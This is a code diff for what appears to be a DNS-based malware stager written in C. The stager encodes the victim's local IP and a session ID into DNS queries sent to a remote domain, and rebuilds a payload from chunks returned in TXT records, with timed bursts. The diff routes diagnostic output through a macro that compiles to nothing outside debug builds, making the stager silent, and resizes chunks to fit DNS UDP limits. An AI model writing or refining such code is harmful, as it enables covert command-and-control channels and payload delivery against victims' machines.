@@ -60,8 +60,10 @@
 
 #if DEBUG_MODE
     #define DEBUG_PRINT(fmt, ...) printf(fmt, ##__VA_ARGS__)
+    #define DIAG_PRINT(fmt, ...) fprintf(stderr, fmt, ##__VA_ARGS__)
 #else
     #define DEBUG_PRINT(fmt, ...) do {} while(0)
+    #define DIAG_PRINT(fmt, ...) do {} while(0)
 #endif
 
 // Configuration - these should match your server setup
@@ -107,7 +109,7 @@
 #endif
 
 #define MAX_CHUNKS 10000  // Maximum chunks to support
-#define CHUNK_SIZE 403  // Chunk size matching server (tested maximum for DNS infrastructure)
+#define CHUNK_SIZE 370  // DNS-safe chunk size for 512-byte UDP limit (matches Master/Server)
 
 // DNS header structure
 typedef struct {
@@ -674,7 +676,7 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
     int recv_len = recvfrom(sock, (char *)answer, sizeof(answer), 0,
                            (struct sockaddr *)&dns_addr, &addr_len);
     
-    fprintf(stderr, "[DIAG] recvfrom returned: %d bytes (buffer size: %zu)\n", recv_len, sizeof(answer));
+    DIAG_PRINT("[DIAG] recvfrom returned: %d bytes (buffer size: %zu)\n", recv_len, sizeof(answer));
 
 #ifdef _WIN32
     closesocket(sock);
@@ -684,7 +686,7 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
 #endif
     
     if (recv_len <= 0) {
-        fprintf(stderr, "[DIAG] Failed to receive response (recv_len=%d)\n", recv_len);
+        DIAG_PRINT("[DIAG] Failed to receive response (recv_len=%d)\n", recv_len);
         DEBUG_PRINT("[!] Failed to receive response (recv_len=%d)\n", recv_len);
         return -1;
     }
@@ -692,7 +694,7 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
     DEBUG_PRINT("[*] Received %d bytes\n", recv_len);
     
     if (recv_len < sizeof(dns_header_t)) {
-        fprintf(stderr, "[DIAG] Response too short: %d bytes (need at least %zu)\n", 
+        DIAG_PRINT("[DIAG] Response too short: %d bytes (need at least %zu)\n", 
                 recv_len, sizeof(dns_header_t));
         DEBUG_PRINT("[!] Response too short: %d bytes\n", recv_len);
         return -1;
@@ -700,36 +702,36 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
     dns_header_t *resp_header = (dns_header_t *)answer;
     uint16_t ancount = ntohs(resp_header->ancount);
     
-    fprintf(stderr, "[DIAG] Answer count: %d\n", ancount);
+    DIAG_PRINT("[DIAG] Answer count: %d\n", ancount);
     DEBUG_PRINT("[*] Answer count: %d\n", ancount);
     
     if (ancount == 0) {
-        fprintf(stderr, "[DIAG] No answers in DNS response\n");
+        DIAG_PRINT("[DIAG] No answers in DNS response\n");
         DEBUG_PRINT("[!] No answers in DNS response\n");
         return -1;
     }
     
     // Skip question section
     size_t offset = sizeof(dns_header_t);
-    fprintf(stderr, "[DIAG] Starting to parse at offset: %zu\n", offset);
+    DIAG_PRINT("[DIAG] Starting to parse at offset: %zu\n", offset);
     if (skip_domain_name(answer, recv_len, &offset) < 0) {
-        fprintf(stderr, "[DIAG] Failed to skip question domain name\n");
+        DIAG_PRINT("[DIAG] Failed to skip question domain name\n");
         return -1;
     }
     offset += 4; // Skip QTYPE and QCLASS
-    fprintf(stderr, "[DIAG] After skipping question, offset: %zu\n", offset);
+    DIAG_PRINT("[DIAG] After skipping question, offset: %zu\n", offset);
     
     // Parse answer section
     for (int i = 0; i < ancount && offset < recv_len; i++) {
-        fprintf(stderr, "[DIAG] Parsing answer %d at offset %zu\n", i, offset);
+        DIAG_PRINT("[DIAG] Parsing answer %d at offset %zu\n", i, offset);
         // Skip name
         if (skip_domain_name(answer, recv_len, &offset) < 0) {
-            fprintf(stderr, "[DIAG] Failed to skip answer domain name\n");
+            DIAG_PRINT("[DIAG] Failed to skip answer domain name\n");
             break;
         }
         
         if (offset + 10 > recv_len) {
-            fprintf(stderr, "[DIAG] Not enough data for answer header (offset=%zu, recv_len=%d)\n", 
+            DIAG_PRINT("[DIAG] Not enough data for answer header (offset=%zu, recv_len=%d)\n", 
                     offset, recv_len);
             break;
         }
@@ -742,12 +744,12 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
         uint16_t rdlen = (answer[offset] << 8) | answer[offset + 1];
         offset += 2;
         
-        fprintf(stderr, "[DIAG] Answer type=%d, rdlen=%d, offset=%zu\n", type, rdlen, offset);
+        DIAG_PRINT("[DIAG] Answer type=%d, rdlen=%d, offset=%zu\n", type, rdlen, offset);
         
         if (type == 16 && offset + rdlen <= recv_len) { // TXT record
-            fprintf(stderr, "[DIAG] Found TXT record, parsing %d bytes of data\n", rdlen);
+            DIAG_PRINT("[DIAG] Found TXT record, parsing %d bytes of data\n", rdlen);
             int parsed = parse_txt_record(answer + offset, rdlen, response, response_size);
-            fprintf(stderr, "[DIAG] Parsed %d bytes from TXT record, result: %.80s...\n", 
+            DIAG_PRINT("[DIAG] Parsed %d bytes from TXT record, result: %.80s...\n", 
                     parsed, response);
             return 0;
         }
@@ -755,7 +757,7 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
         offset += rdlen;
     }
     
-    fprintf(stderr, "[DIAG] No valid TXT record found in response\n");
+    DIAG_PRINT("[DIAG] No valid TXT record found in response\n");
     return -1;
 }
 
@@ -769,17 +771,17 @@ static int send_dns_message(const char *message, const char *target_domain, char
     char domain[1024];
     
     // ALWAYS PRINT - debug encoding issue
-    fprintf(stderr, "[DIAG] Message to encode: '%s' (len=%zu)\n", message, strlen(message));
+    DIAG_PRINT("[DIAG] Message to encode: '%s' (len=%zu)\n", message, strlen(message));
     
     // Base36 encode the message (no encryption for stager)
     base36_encode((const unsigned char *)message, strlen(message), encoded, sizeof(encoded));
     
     // ALWAYS PRINT - debug encoding issue
-    fprintf(stderr, "[DIAG] Encoded result: '%s' (len=%zu)\n", encoded, strlen(encoded));
+    DIAG_PRINT("[DIAG] Encoded result: '%s' (len=%zu)\n", encoded, strlen(encoded));
     
     // Check if encoding failed (empty result)
     if (strlen(encoded) == 0) {
-        fprintf(stderr, "[DIAG] ERROR: base36_encode returned empty string!\n");
+        DIAG_PRINT("[DIAG] ERROR: base36_encode returned empty string!\n");
         return -1;
     }
     
@@ -802,7 +804,7 @@ static int send_dns_message(const char *message, const char *target_domain, char
         snprintf(split_domain, sizeof(split_domain), "%s.%s", label1, encoded + MAX_LABEL_LEN);
     } else {
         // ERROR: Encoded message too long (>126 chars)
-        fprintf(stderr, "[DIAG] ERROR: Encoded message too long (%zu chars, max 126)!\n", encoded_len);
+        DIAG_PRINT("[DIAG] ERROR: Encoded message too long (%zu chars, max 126)!\n", encoded_len);
         return -1;
     }
     
@@ -814,17 +816,17 @@ static int send_dns_message(const char *message, const char *target_domain, char
         snprintf(domain, sizeof(domain), "%s.%lu.%s", 
                  split_domain, (unsigned long)time(NULL), target_domain);
         
-        fprintf(stderr, "[DIAG] Constructed domain: %s (len=%zu)\n", domain, strlen(domain));
+        DIAG_PRINT("[DIAG] Constructed domain: %s (len=%zu)\n", domain, strlen(domain));
         DEBUG_PRINT("[*] Querying: %s\n", domain);
         
         char txt_response[4096];
         int query_result = dns_query_txt(domain, txt_response, sizeof(txt_response));
         
-        fprintf(stderr, "[DIAG] Query result: %d (0=success, -1=failure)\n", query_result);
+        DIAG_PRINT("[DIAG] Query result: %d (0=success, -1=failure)\n", query_result);
     DEBUG_PRINT("[*] Query result: %d\n", query_result);
         
         if (query_result == 0) {
-            fprintf(stderr, "[DIAG] TXT response received: %.80s... (len=%zu)\n", 
+            DIAG_PRINT("[DIAG] TXT response received: %.80s... (len=%zu)\n", 
                     txt_response, strlen(txt_response));
     DEBUG_PRINT("[*] TXT response: %s\n", txt_response);
             
@@ -833,7 +835,7 @@ static int send_dns_message(const char *message, const char *target_domain, char
                 // CHUNK responses are sent as plain text (data is already base64)
                 strncpy(response, txt_response, response_size - 1);
                 response[response_size - 1] = '\0';
-                fprintf(stderr, "[DIAG] CHUNK response detected (plain text, %zu bytes)\n", strlen(response));
+                DIAG_PRINT("[DIAG] CHUNK response detected (plain text, %zu bytes)\n", strlen(response));
     DEBUG_PRINT("[*] CHUNK response (plain text, %zu bytes)\n", strlen(response));
                 return 0;
             }
@@ -1116,35 +1118,35 @@ int main(int argc, char *argv[]) {
                  i, local_ip, session_id[0] ? session_id : "UNKN0WN");
         
         if (send_dns_message(message, target_domain, response, sizeof(response)) != 0) {
-            fprintf(stderr, "[DIAG] Failed to get chunk %d from %s\n", i, target_domain);
+            DIAG_PRINT("[DIAG] Failed to get chunk %d from %s\n", i, target_domain);
     DEBUG_PRINT("[!] Failed to get chunk %d from %s\n", i, target_domain);
             goto cleanup;
         }
         
-        fprintf(stderr, "[DIAG] Received response for chunk %d: %.80s... (len=%zu)\n", 
+        DIAG_PRINT("[DIAG] Received response for chunk %d: %.80s... (len=%zu)\n", 
                 i, response, strlen(response));
         
         // Parse chunk response: CHUNK|<data>
         if (strncmp(response, "CHUNK|", 6) != 0) {
-            fprintf(stderr, "[DIAG] Invalid chunk response format (first 20 chars): %.20s\n", response);
+            DIAG_PRINT("[DIAG] Invalid chunk response format (first 20 chars): %.20s\n", response);
     DEBUG_PRINT("[!] Invalid chunk response format: %s\n", response);
             goto cleanup;
         }
         
-        fprintf(stderr, "[DIAG] Chunk %d parsed successfully, storing data\n", i);
+        DIAG_PRINT("[DIAG] Chunk %d parsed successfully, storing data\n", i);
         
         // Store the base64 encoded chunk
         size_t chunk_len = strlen(response + 6);
         chunks[i] = malloc(chunk_len + 1);
         if (!chunks[i]) {
-            fprintf(stderr, "[DIAG] Failed to allocate memory for chunk %d\n", i);
+            DIAG_PRINT("[DIAG] Failed to allocate memory for chunk %d\n", i);
             goto cleanup;
         }
         
         memcpy(chunks[i], response + 6, chunk_len + 1);
         chunk_sizes[i] = chunk_len;
         
-        fprintf(stderr, "[DIAG] Chunk %d stored (%zu bytes), continuing to next chunk\n", i, chunk_len);
+        DIAG_PRINT("[DIAG] Chunk %d stored (%zu bytes), continuing to next chunk\n", i, chunk_len);
         
         // Apply timing delay ONLY after completing a burst
         // Within a burst, chunks are requested rapidly with no delay
